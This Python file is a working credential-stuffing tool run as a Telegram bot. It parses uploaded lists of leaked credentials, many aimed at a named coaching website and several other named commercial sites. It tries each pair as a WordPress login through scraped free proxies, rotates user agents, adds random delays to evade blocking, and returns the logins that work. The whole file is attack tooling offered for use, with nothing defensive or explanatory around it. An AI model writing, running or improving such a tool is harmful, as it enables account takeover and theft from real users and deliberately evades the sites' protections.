#!/usr/bin/env python3
"""
WP Login Checker Bot - Render Compatible
"""

import os
import sys
import logging
import threading
import re
import random
import time
from datetime import datetime

# Create Event Loop BEFORE Any Imports
import asyncio

try:
    loop = asyncio.get_event_loop()
except RuntimeError:
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)

import requests
from flask import Flask
from pyrogram import Client, filters
from pyrogram.types import Message

# ============ CONFIG ============

API_ID = int(os.environ.get("API_ID", "0") or "0")
API_HASH = os.environ.get("API_HASH", "")
BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
ADMINS = os.environ.get("ADMINS", "")
LEGACY_PROXIES = os.environ.get("PROXIES", "")
MIN_DELAY = float(os.environ.get("MIN_DELAY", "20"))
MAX_DELAY = float(os.environ.get("MAX_DELAY", "50"))

ALLOWED_USERS = []
if ADMINS:
    ALLOWED_USERS = [int(id.strip()) for id in ADMINS.split(',') if id.strip().isdigit()]

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s"
)
logger = logging.getLogger(__name__)

def is_admin(user_id):
    return user_id in ALLOWED_USERS if ALLOWED_USERS else False

# ============ FLASK SERVER ============

flask_app = Flask(__name__)

@flask_app.route("/")
def health_check():
    return "✅ Bot is running", 200

def run_flask():
    port = int(os.environ.get("PORT", 10000))
    flask_app.run(host="0.0.0.0", port=port, use_reloader=False, threaded=True)

# ============ PROXY MANAGEMENT ============

_MEMORY_PROXIES = []
_LAST_REFRESH = None

def fetch_proxies_sync():
    """Fetch proxies synchronously"""
    sources = [
        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all&limit=100",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
    ]
    
    all_proxies = []
    
    for url in sources:
        try:
            resp = requests.get(url, timeout=15)
            if resp.status_code == 200:
                for line in resp.text.strip().split('\n'):
                    line = line.strip()
                    if ':' in line and not line.startswith('#'):
                        proxy = line.split('@')[-1] if '@' in line else line
                        if not proxy.startswith('http'):
                            proxy = f"http://{proxy}"
                        try:
                            ip, port = proxy.replace('http://', '').split(':')
                            if ip.count('.') == 3 and port.isdigit():
                                all_proxies.append(proxy)
                        except:
                            pass
        except Exception as e:
            logger.debug(f"Source failed: {e}")
    
    # Deduplicate
    seen = set()
    unique = []
    for p in all_proxies:
        if p not in seen:
            seen.add(p)
            unique.append(p)
    
    logger.info(f"Fetched {len(unique)} unique proxies")
    return unique[:100]

def check_proxy_simple(proxy):
    """Simple proxy check"""
    try:
        proxies = {'http': proxy, 'https': proxy}
        resp = requests.get(
            "http://httpbin.org/ip",
            proxies=proxies,
            timeout=10
        )
        return resp.status_code == 200
    except:
        return False

def refresh_proxies_sync():
    """Refresh proxies"""
    global _MEMORY_PROXIES, _LAST_REFRESH
    
    logger.info("=" * 40)
    logger.info("🔄 Refreshing proxies...")
    
    try:
        all_proxies = fetch_proxies_sync()
        if len(all_proxies) < 20:
            logger.warning("Too few proxies fetched")
            return False
        
        logger.info(f"🔍 Testing {min(30, len(all_proxies))} proxies...")
        working = []
        
        for proxy in all_proxies[:30]:
            if check_proxy_simple(proxy):
                working.append(proxy)
        
        if len(working) < 3:
            logger.warning(f"Only {len(working)} working, keeping old")
            # Use unverified if no working found
            if not _MEMORY_PROXIES:
                _MEMORY_PROXIES = all_proxies[:50]
                _LAST_REFRESH = datetime.now()
                logger.info(f"Using {len(_MEMORY_PROXIES)} unverified proxies")
                return True
            return False
        
        _MEMORY_PROXIES = working
        _LAST_REFRESH = datetime.now()
        
        logger.info(f"✅ {len(working)} working proxies ready")
        return True
        
    except Exception as e:
        logger.error(f"❌ Refresh failed: {e}")
        return False

def get_random_proxy():
    """Get random working proxy"""
    if _MEMORY_PROXIES:
        return random.choice(_MEMORY_PROXIES)
    if LEGACY_PROXIES:
        legacy = [p.strip() for p in LEGACY_PROXIES.split(',') if p.strip()]
        return random.choice(legacy) if legacy else None
    return None

def auto_refresh_loop():
    """Background thread for auto-refresh"""
    refresh_proxies_sync()
    while True:
        time.sleep(1800)  # 30 minutes
        refresh_proxies_sync()

# Start auto-refresh
threading.Thread(target=auto_refresh_loop, daemon=True).start()

# ============ ANTI-DETECTION ============

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
]

FAILED_DOMAINS = {}

def get_headers():
    ua = random.choice(USER_AGENTS)
    return {
        'User-Agent': ua,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate',
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'DNT': '1',
    }

def mark_failed(domain):
    FAILED_DOMAINS[domain] = time.time()

def is_cooled(domain):
    if domain in FAILED_DOMAINS:
        return time.time() - FAILED_DOMAINS[domain] < 300
    return False

# ============ PARSER ============

def parse_line(line):
    """Smart parser - handles ANY format automatically"""
    line = line.strip()
    if not line or line.startswith('#'):
        return None
    
    LOGIN_URL = "https://coaching.miteshkhatri.com/login"
    
    try:
        # Remove all URL patterns
        url_patterns = [
            'https://coaching.miteshkhatri.com/password/edit:',
            'https://coaching.miteshkhatri.com/password:',
            'https://coaching.miteshkhatri.com/login:',
            'https://coaching.miteshkhatri.com/sign_up:',
            'https://coaching.miteshkhatri.com/:',
            'https://coaching.miteshkhatri.com:',
            'http://coaching.miteshkhatri.com/login:',
            'http://coaching.miteshkhatri.com:',
            'coaching.miteshkhatri.com/login:',
            'coaching.miteshkhatri.com/password/edit:',
            'coaching.miteshkhatri.com/password:',
            'coaching.miteshkhatri.com/sign_up:',
            'coaching.miteshkhatri.com:',
            'community.miteshkhatri.com/sign_up:',
            'community.miteshkhatri.com/:',
            'community.miteshkhatri.com:',
            'partners.miteshkhatri.com:',
            'https://community.miteshkhatri.com/sign_up:',
            'https://community.miteshkhatri.com/:',
            'https://community.miteshkhatri.com:',
            'https://www.duroflexworld.com:',
            'https://app.joinsuperset.com:',
            'https://app.houseparty.com:',
            'https://citymall.com.mm/citymart_en/customer/account/create:',
        ]
        
        cleaned = line
        
        for pattern in url_patterns:
            if cleaned.startswith(pattern):
                cleaned = cleaned[len(pattern):]
                break
        
        # Handle URL at end
        parts = cleaned.split(':')
        if len(parts) >= 3:
            last_part = parts[-1].lower()
            if 'miteshkhatri' in last_part or last_part.startswith('http'):
                cleaned = ':'.join(parts[:-1])
        
        if not cleaned or cleaned == ':':
            return None
        
        # Split username:password
        if cleaned.count(':') == 1:
            username, password = cleaned.split(':')
        else:
            # Multiple colons - find email boundary
            if '@' in cleaned:
                at_pos = cleaned.find('@')
                colon_pos = cleaned.find(':', at_pos)
                if colon_pos != -1:
                    username = cleaned[:colon_pos]
                    password = cleaned[colon_pos + 1:]
                else:
                    username, password = cleaned.split(':', 1)
            else:
                username, password = cleaned.split(':', 1)
        
        username = username.strip().rstrip('/').rstrip(':')
        password = password.strip().rstrip('/').rstrip(':')
        
        # Validate
        if not username or not password:
            return None
        if username.lower() == 'unknown':
            return None
        if username in ['loa', 'http', 'https']:
            return None
        if 'miteshkhatri' in username or 'http' in username:
            return None
        if 'miteshkhatri' in password or password.startswith('http'):
            return None
        if len(username) < 2:
            return None
        
        return (LOGIN_URL, username, password)
        
    except Exception as e:
        logger.debug(f"Parse error: {e}")
        return None

# ============ LOGIN CHECKER ============

def check_login_sync(url, user, pwd):
    """Synchronous login check"""
    domain = url.split('/')[2]
    
    if is_cooled(domain):
        time.sleep(60)
    
    proxy = get_random_proxy()
    proxies = {'http': proxy, 'https': proxy} if proxy else None
    
    # Random delay
    time.sleep(random.uniform(MIN_DELAY, MAX_DELAY))
    
    session = requests.Session()
    headers = get_headers()
    
    try:
        # GET login page
        resp = session.get(url, headers=headers, timeout=20, proxies=proxies)
        
        if resp.status_code == 403:
            mark_failed(domain)
            return None, '403 Blocked'
        
        if resp.status_code == 429:
            mark_failed(domain)
            time.sleep(120)
            return None, '429 Rate limited'
        
        # Cloudflare check
        if any(x in resp.text for x in ['cf-ray', '__cf_bm', 'Just a moment']):
            mark_failed(domain)
            return None, 'Cloudflare'
        
        # Build payload
        payload = {
            'log': user,
            'pwd': pwd,
            'rememberme': 'forever',
            'wp-submit': 'Log In',
            'testcookie': '1'
        }
        
        # Extract hidden fields
        for match in re.finditer(r'name=["\']([^"\']+)["\'][^>]*value=["\']([^"\']*)["\']', resp.text):
            name, val = match.groups()
            if name not in payload:
                payload[name] = val
        
        # POST login
        time.sleep(random.uniform(2, 5))
        
        post_headers = headers.copy()
        post_headers['Content-Type'] = 'application/x-www-form-urlencoded'
        post_headers['Referer'] = url
        
        resp = session.post(
            url,
            data=payload,
            headers=post_headers,
            timeout=20,
            proxies=proxies,
            allow_redirects=True
        )
        
        # Check cookies
        cookies = [c.name for c in session.cookies]
        
        # Success checks
        if any('wordpress_logged_in' in c for c in cookies):
            return True, 'Logged in cookie'
        
        if '/wp-admin' in resp.url and 'login' not in resp.url:
            return True, 'Admin redirect'
        
        # Failure checks
        text = resp.text.lower()
        if 'incorrect' in text or 'invalid' in text:
            return False, 'Wrong credentials'
        
        return None, 'Unknown response'
        
    except requests.Timeout:
        return None, 'Timeout'
    except Exception as e:
        return None, str(e)[:50]

# ============ BATCH PROCESSING ============

def process_batch_sync(credentials, progress_callback=None):
    """Process batch synchronously"""
    results = {'valid': [], 'invalid': [], 'error': [], 'total': len(credentials)}
    
    for i, (url, user, pwd) in enumerate(credentials):
        if progress_callback:
            progress_callback(i + 1, len(credentials), user)
        
        if i > 0:
            time.sleep(random.uniform(5, 10))
        
        valid, reason = check_login_sync(url, user, pwd)
        line = f"{url}:{user}:{pwd}"
        
        if valid is True:
            results['valid'].append({'line': line, 'reason': reason})
        elif valid is False:
            results['invalid'].append({'line': line, 'reason': reason})
        else:
            results['error'].append({'line': line, 'reason': reason})
    
    return results

# ============ TELEGRAM BOT ============

bot = Client(
    "wp_bot",
    api_id=API_ID,
    api_hash=API_HASH,
    bot_token=BOT_TOKEN,
    in_memory=True
)

@bot.on_message(filters.command("start"))
async def cmd_start(c, m):
    uid = m.from_user.id
    await m.reply(f"""👋 **WP Checker Bot**

**Your ID:** `{uid}`

**Commands:**
• `/check <url> <user> <pass>` - Single check
• `/checkfile` - Upload .txt file
• `/status` - Bot status
• `/refresh` - Refresh proxies

**Format:** `https://site.com:admin:password`

Add `{uid}` to ADMINS env var.""")

@bot.on_message(filters.command("status"))
async def cmd_status(c, m):
    if not is_admin(m.from_user.id):
        return await m.reply("⛔ Not authorized")
    
    lr = _LAST_REFRESH
    await m.reply(f"""📊 **Status**

🤖 Bot: **Online**
📡 Proxies: **{len(_MEMORY_PROXIES)}** working
⏱️ Delay: **{MIN_DELAY}s - {MAX_DELAY}s**
🕐 Last refresh: **{lr.strftime('%H:%M:%S') if lr else 'Never'}**

**Protection:**
✅ Proxy rotation
✅ Random delays  
✅ Domain cooldown""")

@bot.on_message(filters.command("refresh"))
async def cmd_refresh(c, m):
    if not is_admin(m.from_user.id):
        return await m.reply("⛔ Not authorized")
    
    msg = await m.reply("🔄 Refreshing proxies...")
    
    def do_refresh():
        return refresh_proxies_sync()
    
    loop = asyncio.get_event_loop()
    result = await loop.run_in_executor(None, do_refresh)
    
    if result:
        await msg.edit(f"✅ Refreshed! **{len(_MEMORY_PROXIES)}** proxies ready")
    else:
        await msg.edit("⚠️ Refresh failed")

@bot.on_message(filters.command("check"))
async def cmd_check(c, m):
    if not is_admin(m.from_user.id):
        return await m.reply("⛔ Not authorized")
    
    args = m.text.split()[1:]
    if len(args) < 3:
        return await m.reply("❌ Usage: `/check url user pass`")
    
    url = args[0]
    if not url.startswith('http'):
        url = "https://coaching.miteshkhatri.com/login"
    
    user, pwd = args[1], ' '.join(args[2:])
    
    msg = await m.reply(f"⏳ Checking `{user}`...")
    
    def do_check():
        return check_login_sync(url, user, pwd)
    
    try:
        loop = asyncio.get_event_loop()
        valid, reason = await loop.run_in_executor(None, do_check)
        
        if valid is True:
            text = f"""✅ **VALID**

🔗 `{url}`
👤 `{user}`
🔑 `{pwd}`
📋 {reason}"""
        elif valid is False:
            text = f"""❌ **INVALID**

🔗 `{url}`
👤 `{user}`
📋 {reason}"""
        else:
            text = f"""⚠️ **ERROR**

🔗 `{url}`
👤 `{user}`
❌ {reason}"""
        
        await msg.edit(text)
    except Exception as e:
        await msg.edit(f"❌ Error: `{e}`")

# ============ FIXED FILE HANDLER ============

@bot.on_message(filters.document & filters.private)
async def handle_file(c, m):
    """Handle uploaded credential files"""
    if not is_admin(m.from_user.id):
        return await m.reply("⛔ Not authorized")
    
    # Validate file
    file_name = m.document.file_name or "unknown"
    if not file_name.endswith('.txt'):
        return await m.reply("❌ Only .txt files allowed")
    
    # Check file size
    file_size = m.document.file_size or 0
    if file_size == 0:
        return await m.reply("❌ File is empty (0 bytes)")
    if file_size > 10 * 1024 * 1024:
        return await m.reply("❌ File too large! Max 10MB")
    
    msg = await m.reply(f"📥 Downloading {file_size} bytes...")
    
    try:
        # Download file
        download_path = await m.download()
        
        if not download_path:
            return await msg.edit("❌ Download failed - no path returned")
        
        if not os.path.exists(download_path):
            return await msg.edit("❌ Download failed - file not found")
        
        actual_size = os.path.getsize(download_path)
        if actual_size == 0:
            os.remove(download_path)
            return await msg.edit("❌ Downloaded file is empty")
        
        await msg.edit(f"📖 Reading {actual_size} bytes...")
        
        # Read with multiple encodings
        content = None
        encodings = ['utf-8', 'utf-8-sig', 'latin-1', 'cp1252']
        
        for encoding in encodings:
            try:
                with open(download_path, 'r', encoding=encoding, errors='ignore') as f:
                    content = f.read()
                    if content and content.strip():
                        logger.info(f"Read file with {encoding}: {len(content)} chars")
                        break
            except Exception as e:
                logger.debug(f"Failed with {encoding}: {e}")
                continue
        
        # Cleanup download
        try:
            os.remove(download_path)
        except:
            pass
        
        if not content or not content.strip():
            return await msg.edit("❌ File is empty or unreadable")
        
        # Parse lines
        lines = [l.strip() for l in content.split('\n') if l.strip()]
        logger.info(f"File has {len(lines)} non-empty lines")
        
        # Parse credentials
        creds = []
        for i, line in enumerate(lines, 1):
            parsed = parse_line(line)
            if parsed:
                creds.append(parsed)
                logger.debug(f"Line {i}: Parsed OK - {parsed[1][:30]}...")
            else:
                logger.debug(f"Line {i}: Skipped - {line[:50]}...")
        
        if not creds:
            return await msg.edit(
                f"❌ No valid credentials found!\n\n"
                f"📄 Checked {len(lines)} lines\n"
                f"💡 Expected format: URL:username:password or username:password"
            )
        
        total = len(creds)
        eta = (total * 35) // 60
        
        await msg.edit(
            f"✅ Found **{total}** valid credentials\n"
            f"📄 Total lines: {len(lines)}\n"
            f"⏱️ ETA: ~{eta} minutes\n\n"
            f"🔍 Starting checks..."
        )
        
        # Process
        def do_batch():
            return process_batch_sync(creds)
        
        loop = asyncio.get_event_loop()
        start = time.time()
        results = await loop.run_in_executor(None, do_batch)
        elapsed = time.time() - start
        
        # Save results
        valid_file = f"valid_{datetime.now():%Y%m%d_%H%M%S}.txt"
        valid_count = len(results['valid'])
        
        with open(valid_file, 'w', encoding='utf-8') as f:
            for item in results['valid']:
                f.write(item['line'] + '\n')
        
        # Summary
        summary = (
            f"✅ **Complete!**\n\n"
            f"📊 Total: **{total}**\n"
            f"✅ Valid: **{valid_count}**\n"
            f"❌ Invalid: **{len(results['invalid'])}**\n"
            f"⚠️ Errors: **{len(results['error'])}**\n"
            f"⏱️ Time: **{elapsed//60}m {elapsed%60:.0f}s**"
        )
        
        await msg.edit(summary)
        
        # Send valid file
        if valid_count > 0:
            await m.reply_document(valid_file, caption=f"✅ **{valid_count}** valid")
        
        # Cleanup
        try:
            os.remove(valid_file)
        except:
            pass
        
    except Exception as e:
        logger.error(f"File error: {e}", exc_info=True)
        await msg.edit(f"❌ Error: `{str(e)[:200]}`")

# ============ MAIN ============

if __name__ == "__main__":
    # Start Flask
    threading.Thread(target=run_flask, daemon=True).start()
    logger.info("🌐 Flask started")
    
    # Wait for proxies
    time.sleep(3)
    
    # Start bot
    logger.info("🤖 Starting bot...")
    bot.run()
